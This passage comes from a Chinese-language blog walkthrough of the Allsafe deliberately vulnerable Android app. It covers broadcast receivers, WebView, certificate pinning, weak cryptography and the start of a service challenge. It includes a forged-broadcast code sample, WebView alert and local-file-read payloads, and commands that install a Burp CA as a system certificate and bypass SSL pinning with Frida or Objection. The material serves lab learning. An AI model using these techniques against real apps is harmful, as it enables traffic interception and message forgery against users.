<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="comment">//intent.setAction(&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;);</span></span><br><span class="line">intent.putExtra(<span class="string">&quot;server&quot;</span>, <span class="string">&quot;prod.allsafe.infosecadventures.io&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;note&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;notification_message&quot;</span>, <span class="string">&quot;Fake message&quot;</span>);</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">componentName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;infosecadventures.allsafe&quot;</span>,<span class="string">&quot;infosecadventures.allsafe.challenges.NoteReceiver&quot;</span>);</span><br><span class="line">intent.setComponent(componentName);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>

<p>不过注意需要在AndroidManifest.xml文件manifest标签中添加：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.QUERY_ALL_PACKAGES&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">&quot;infosecadventures.allsafe&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br></pre></td></tr></table></figure>





<p>类似的实际案例有：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/289000">https://hackerone.com/reports/289000</a> 、 <a target="_blank" rel="noopener" href="https://hackerone.com/reports/97295">https://hackerone.com/reports/97295</a></p>
<p>结合其他资料不难总结Broadcast Receiver的风险主要在于广播被其他应用获取导致的敏感信息泄漏，还有接收了其他应用的广播导致的权限绕过、消息伪造、拒绝服务等</p>
<h3 id="Vulnerable-WebView"><a href="#Vulnerable-WebView" class="headerlink" title="Vulnerable WebView"></a>Vulnerable WebView</h3><blockquote>
<p>This challange is intended to be solved without decompiling the application. The first task is show an alert dialog. For the second task, you have to access a local file (e.g. &#x2F;etc&#x2F;hosts) stored on the device.</p>
</blockquote>
<h4 id="WebView介绍"><a href="#WebView介绍" class="headerlink" title="WebView介绍"></a>WebView介绍</h4><p>WebView是App中的一个核心组件，简单来说就是一个内置的浏览器，参考 <a target="_blank" rel="noopener" href="https://developer.android.com/develop/ui/views/layout/webapps/webview">https://developer.android.com/develop/ui/views/layout/webapps/webview</a> 可以写一下WebView的Demo代码：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WebAppInterface</span> &#123;</span><br><span class="line">    Context mContext;</span><br><span class="line">    WebAppInterface(Context c) &#123;</span><br><span class="line">        mContext = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showToast</span><span class="params">(String toast)</span> &#123;</span><br><span class="line">        Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> MyBroadcastReceiver myBroadcastReceiver;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">        <span class="type">WebView</span> <span class="variable">myWebView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(myWebView);</span><br><span class="line">        <span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> myWebView.getSettings();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//开启JavaScript支持</span></span><br><span class="line">        webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//允许读取本地文件，例如file:///etc/hosts</span></span><br><span class="line">        webSettings.setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将Android代码暴露给Javascript调用</span></span><br><span class="line">        myWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">WebAppInterface</span>(<span class="built_in">this</span>), <span class="string">&quot;Android&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//shouldOverrideUrlLoading返回false，否则点击其他HTTP链接会默认由系统浏览器打开。这个函数中也可以做一些URL跳转的检测和拦截等</span></span><br><span class="line">        myWebView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//myWebView.loadUrl(&quot;https://www.baidu.com&quot;);</span></span><br><span class="line">        <span class="comment">//myWebView.loadUrl(&quot;file:///etc/hosts&quot;);</span></span><br><span class="line">        myWebView.loadUrl(<span class="string">&quot;data:text/html,&lt;button onclick=\&quot;Android.showToast(&#x27;test&#x27;)\&quot;&gt;showToast&lt;/button&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="WebView风险"><a href="#WebView风险" class="headerlink" title="WebView风险"></a>WebView风险</h4><p>目前的WebView漏洞主要是由于URL校验不当，导致加载任意网页或者是调用一些特权接口，其具体风险在这篇文章中已经讲解的很详细了：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273867.htm">https://bbs.kanxue.com/thread-273867.htm</a></p>
<p>看靶场APK，允许JavaScript也允许本地文件访问：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241221224258077.png" class="" title="image-20241221224258077">

<p>所以解题很简单：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>alert<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/hosts</span><br></pre></td></tr></table></figure>



<h3 id="Certificate-Pinning"><a href="#Certificate-Pinning" class="headerlink" title="Certificate Pinning"></a>Certificate Pinning</h3><blockquote>
<p>In this challange, your task is to intercept the traffic and bypass the certificate pinning. The implementation is fairly good, so you might have to use Frida or patch the APK.</p>
</blockquote>
<h4 id="SSL-Pinning"><a href="#SSL-Pinning" class="headerlink" title="SSL Pinning"></a>SSL Pinning</h4><p>HTTP是明文传输的协议，容易被窃听和篡改，或者说被中间人攻击（MITM），于是HTTP over SSL即HTTPS出现了。访问HTTPS网站时，服务端会提供自己的证书，客户端会进行验证，例如在浏览器中可以查看到以下证书链：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241222100538859.png" class="" title="image-20241222100538859">

<p>系统会内置一些CA证书，如上图的GlobalSign就在系统中，那么如浏览器这类客户端就会信任内置Root CA签发的二级Intermediate CA或者用户证书。这也是为什么使用BurpSuite抓HTTPS包的时候需要在系统导入BurpSuite的CA证书，如下图使用BurpSuite代理抓包时证书是由PortSwigger CA签发的：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241222102240927.png" class="" title="image-20241222102240927">

<p>综上，如果导入了其他根证书或者被信任的CA随意发布证书，那么SSL是无法保证安全的，而SSL Pinning本质就是为了对抗这种情况下的中间人攻击，实现原理是在应用程序中只信任固定证书或是公钥。</p>
<p>详细可参考： <a target="_blank" rel="noopener" href="https://shunix.com/ssl-pinning/">https://shunix.com/ssl-pinning/</a> 、 <a target="_blank" rel="noopener" href="https://juejin.cn/post/7178044116364689465">https://juejin.cn/post/7178044116364689465</a></p>
<h5 id="在Android13中使用BurpSuite抓包"><a href="#在Android13中使用BurpSuite抓包" class="headerlink" title="在Android13中使用BurpSuite抓包"></a>在Android13中使用BurpSuite抓包</h5><p>可以通过adb设置代理为BurpSuite监听地址：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings put global http_proxy 192.168.64.1:65534</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb shell settings put global http_proxy :0</span></span><br></pre></td></tr></table></figure>

<p>然后用以下代码测试：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">request</span><span class="params">(String url)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder().url(url).build();</span><br><span class="line">    client.newCall(request).enqueue(<span class="keyword">new</span> <span class="title class_">Callback</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFailure</span><span class="params">(<span class="meta">@NonNull</span> Call call, <span class="meta">@NonNull</span> IOException e)</span> &#123;</span><br><span class="line">            Log.d(TAG,e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResponse</span><span class="params">(<span class="meta">@NonNull</span> Call call, <span class="meta">@NonNull</span> Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            Log.d(TAG,response.body().string());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">request(<span class="string">&quot;http://example.com&quot;</span>);</span><br><span class="line">request(<span class="string">&quot;https://example.com&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>其实就可以抓HTTP请求包了（Android 9.0以上需要在AndroidManifest.xml文件application标签添加android:usesCleartextTraffic&#x3D;”true”才能使用HTTP请求），如果需要抓HTTPS请求，那么还是需要导入BurpSuite的CA证书。</p>
<p>因为Android14证书策略有较大改变，所以我换了13的镜像来做抓包测试。首先使用openssl将BurpSuite的der格式CA证书转为pem格式，再转为${HASH}.0：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform DER -in cacert.der -out cacert.pem</span><br><span class="line">HASH=`openssl x509 -subject_hash_old -in cacert.pem |head -1`</span><br><span class="line">echo $&#123;HASH&#125;</span><br><span class="line">cp cacert.pem &quot;$&#123;HASH&#125;.0&quot;</span><br></pre></td></tr></table></figure>

<p>我当前模拟器&#x2F;system默认无法写也无法重新挂载，参考Android Studio的 <a target="_blank" rel="noopener" href="https://developer.android.com/studio/run/emulator-commandline">Start the emulator from the command line</a> 可以从命令行启动模拟器并创建可写系统映像（-writable-system会创建系统映像的临时副本）：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/Library/Android/sdk/emulator/emulator -list-avds</span><br><span class="line">~/Library/Android/sdk/emulator/emulator -avd  Medium_Phone_API_33 -writable-system -qt-hide-window</span><br></pre></td></tr></table></figure>

<p>然后便可以重新挂载和写入证书：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb push &quot;$&#123;HASH&#125;.0&quot; /system/etc/security/cacerts</span><br><span class="line">adb unroot</span><br></pre></td></tr></table></figure>

<p>从设置中也可以看到添加的系统证书：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241222144938369.png" class="" title="image-20241222144938369">

<p>这便可以抓HTTPS请求包了。</p>
<h5 id="使用OkHttp固定证书"><a href="#使用OkHttp固定证书" class="headerlink" title="使用OkHttp固定证书"></a>使用OkHttp固定证书</h5><p>OkHttp官方就有提供证书固定的方法： <a target="_blank" rel="noopener" href="https://square.github.io/okhttp/features/https/#certificate-pinning-kt-java">https://square.github.io/okhttp/features/https/#certificate-pinning-kt-java</a></p>
<p>测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">request</span><span class="params">(<span class="type">boolean</span> sslPinning)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (sslPinning)&#123;</span><br><span class="line">        client = <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder().certificatePinner(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">CertificatePinner</span>.Builder()</span><br><span class="line">                        .add(<span class="string">&quot;publicobject.com&quot;</span>, <span class="string">&quot;sha256/afwiKY3RxoMmLkuRW1l7QsPZTJPwDS2pdDROQjXw8ig=&quot;</span>)</span><br><span class="line">                        .build()</span><br><span class="line">        ).build();</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        client = <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder().url(<span class="string">&quot;https://publicobject.com/robots.txt&quot;</span>).build();</span><br><span class="line">    client.newCall(request).enqueue(<span class="keyword">new</span> <span class="title class_">Callback</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFailure</span><span class="params">(<span class="meta">@NonNull</span> Call call, <span class="meta">@NonNull</span> IOException e)</span> &#123;</span><br><span class="line">            Log.d(TAG,e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResponse</span><span class="params">(<span class="meta">@NonNull</span> Call call, <span class="meta">@NonNull</span> Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            Log.d(TAG,response.body().string());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">request(<span class="literal">false</span>);</span><br><span class="line">request(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>会发现不固定证书时可以正常请求和抓包，固定证书后报错如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.net.ssl.SSLPeerUnverifiedException: Certificate pinning failure!</span><br><span class="line">Peer certificate chain:</span><br><span class="line">  sha256/uKNneHUC2ZanioF0Kt5SaBEjmW5eaQZOWzqLwE3q0oE=: CN=publicobject.com,OU=PortSwigger CA,O=PortSwigger,C=PortSwigger</span><br><span class="line">  sha256/uKNneHUC2ZanioF0Kt5SaBEjmW5eaQZOWzqLwE3q0oE=: CN=PortSwigger CA,OU=PortSwigger CA,O=PortSwigger,L=PortSwigger,ST=PortSwigger,C=PortSwigger</span><br><span class="line">Pinned certificates for publicobject.com:</span><br><span class="line">  sha256/afwiKY3RxoMmLkuRW1l7QsPZTJPwDS2pdDROQjXw8ig=</span><br></pre></td></tr></table></figure>



<h5 id="使用Android配置固定证书"><a href="#使用Android配置固定证书" class="headerlink" title="使用Android配置固定证书"></a>使用Android配置固定证书</h5><p>参考 <a target="_blank" rel="noopener" href="https://developer.android.com/privacy-and-security/security-config#CertificatePinning">https://developer.android.com/privacy-and-security/security-config?#CertificatePinning</a></p>
<p>只需要添加如下配置：</p>
<p>res&#x2F;xml&#x2F;network_security_config.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base-config</span> <span class="attr">cleartextTrafficPermitted</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 允许所有域名的http请求 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">base-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">domain-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">domain</span> <span class="attr">includeSubdomains</span>=<span class="string">&quot;true&quot;</span>&gt;</span>example.com<span class="tag">&lt;/<span class="name">domain</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pin-set</span> <span class="attr">expiration</span>=<span class="string">&quot;2035-01-01&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pin</span> <span class="attr">digest</span>=<span class="string">&quot;SHA-256&quot;</span>&gt;</span>Wec45nQiFwKvHtuHxSAMGkt19k+uPSw9JlEkxhvYPHk=<span class="tag">&lt;/<span class="name">pin</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- backup pin --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pin</span> <span class="attr">digest</span>=<span class="string">&quot;SHA-256&quot;</span>&gt;</span>i7WTqTvh0OioIruIfFR4kMPnBqrS2rdiVPl/s2uC/CY=<span class="tag">&lt;/<span class="name">pin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pin-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">domain-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后在AndroidManifest.xml文件的application标签添加<code>android:networkSecurityConfig=&quot;@xml/network_security_config&quot;</code>即可。</p>
<p>这个时候如果没有中间人将可以正常请求 <a target="_blank" rel="noopener" href="https://example.com/">https://example.com/</a> ，代理到BurpSuite则会报错：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.net.ssl.SSLHandshakeException: Pin verification failed</span><br></pre></td></tr></table></figure>



<h4 id="靶场SSL-Pinning绕过"><a href="#靶场SSL-Pinning绕过" class="headerlink" title="靶场SSL Pinning绕过"></a>靶场SSL Pinning绕过</h4><p>靶场APK其实是利用OkHttp证书固定功能验证失败时返回的证书链的正确的证书公钥Hash去做证书固定：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241222155344298.png" class="" title="image-20241222155344298">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241222155258502.png" class="" title="image-20241222155258502">



<p>SSL Pinning绕过有通用的Frida脚本：<a target="_blank" rel="noopener" href="https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/">https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/</a></p>
<p>将BurpSuite的der格式CA证书转为crt格式，放到指定路径，然后运行这个脚本即可：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in cacert.der -out cacert.crt</span><br><span class="line">adb push cacert.crt /data/local/tmp/cert-der.crt</span><br><span class="line">frida -U -f infosecadventures.allsafe --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida</span><br></pre></td></tr></table></figure>

<p>不过因为每次请求都是动态去获取证书链公钥的Hash来做证书固定，而挂上BurpSuite代理后，请求网站的证书都由BurpSuite生成签发，然后BurpSuite的CA证书也添加到了系统，其签发的证书是受信任的，所以这里不需要绕过也能抓包（如果没有添加BurpSuite的CA证书，那么就需要使用这个方法了）。</p>
<p>除了使用上述Frida代码，Objection也封装了SSL Pinning绕过，可以直接使用：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g infosecadventures.allsafe explore --startup-command &quot;android sslpinning disable&quot;</span><br></pre></td></tr></table></figure>

<p>源码在：<a target="_blank" rel="noopener" href="https://github.com/sensepost/objection/blob/master/agent/src/android/pinning.ts">https://github.com/sensepost/objection/blob/master/agent/src/android/pinning.ts</a> </p>
<p>和前者绕过方法不太一样，但本质原理都是利用Frida框架提供的功能，在 Java层进行代码注入和方法重写来干预应用原本的SSL相关操作逻辑。</p>
<p>最后一点：一般来说用了Objection这种工具的SSL Pinning绕过功能后，不需要再向系统导入抓包工具的CA证书，直接设置代理就可以抓包。</p>
<h3 id="Weak-Cryptography"><a href="#Weak-Cryptography" class="headerlink" title="Weak Cryptography"></a>Weak Cryptography</h3><blockquote>
<p>Enter your deepest, darkest secret here and we’ll encrypt it for you. By reverse engineering the code you’ll find what you are looking for, but that’s too easy and way too convenient. Let’s use Frida and hook some methods that are used during encryption.</p>
</blockquote>
<p>这节其实只是练习用Frida Hook加密函数，在《Android应用安全实战：Frida协议分析》第4章 算法“自吐”脚本开发 就有详细讲解——“只要把现行常用的密码学加密的通用方法进行Hook，就可以覆盖市面上大部分的Android应用了，配合堆栈打印后还能直接定位到加密点”。</p>
<p>可以直接找现有脚本：<a target="_blank" rel="noopener" href="https://codeshare.frida.re/@fadeevab/intercept-android-apk-crypto-operations/">https://codeshare.frida.re/@fadeevab/intercept-android-apk-crypto-operations/</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f infosecadventures.allsafe --codeshare fadeevab/intercept-android-apk-crypto-operations</span><br></pre></td></tr></table></figure>



<h3 id="Insecure-Service"><a href="#Insecure-Service" class="headerlink" title="Insecure Service"></a>Insecure Service</h3><blockquote>
<p>The application needs the RECORD_AUDIO permission for some reason. Find out why the app needs this and write a simple app to mis-use the functionality on this fragment.</p>
</blockquote>
<h4 id="Service介绍"><a href="#Service介绍" class="headerlink" title="Service介绍"></a>Service介绍</h4><p>Service是Android的四大组件之一，是实现程序后台运行的解决方案，适合执行不需要和用户交互而且还要求长期运行的任务，但Service并不是运行在一个独立的进程当中的，而是依赖于创建Service时所在的应用程序进程。而且Service并不会自动开启线程，所有的代码都是默认运行在主线程当中。示例代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="comment">//Service第一次创建的时候调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;onCreate&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//每次启动Service的时候都会调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;onStartCommand&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() 